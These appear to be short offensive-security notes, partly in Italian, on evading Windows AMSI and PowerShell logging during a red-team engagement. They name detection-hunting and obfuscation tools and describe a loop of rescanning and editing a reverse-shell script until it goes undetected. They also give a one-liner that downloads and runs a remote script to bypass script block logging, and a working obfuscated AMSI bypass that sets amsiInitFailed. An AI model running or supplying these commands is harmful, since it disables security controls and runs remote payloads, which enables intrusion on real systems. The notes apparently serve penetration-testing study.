_AMSI Trigger_ 
[RythmStick/AMSITrigger: The Hunt for Malicious Strings (github.com)](https://github.com/RythmStick/AMSITrigger)

```
AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1
```

_INVOKE OBFUSCATION_
[danielbohannon/Invoke-Obfuscation: PowerShell Obfuscator (github.com)](https://github.com/danielbohannon/Invoke-Obfuscation)

---

**PER BYPASSARE L'AMSI**

1. Scan usando AMSITrigger
2. Modifica la porzione di codice cioccata
3. Rescan con AMSITrigger
4. Ripeti step 2 e 3 finchè non ottieni ==AMSI_RESULT_NOT_DETECTED== o ==BLANK==

or 


First bypass the Enhanced Script Block Logging on the reverse shell
```powershell
iex (iwr http://172.16.99.115/sbloggingbypass.txt -UseBasicParsing)
```
To bypass the AMSI
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```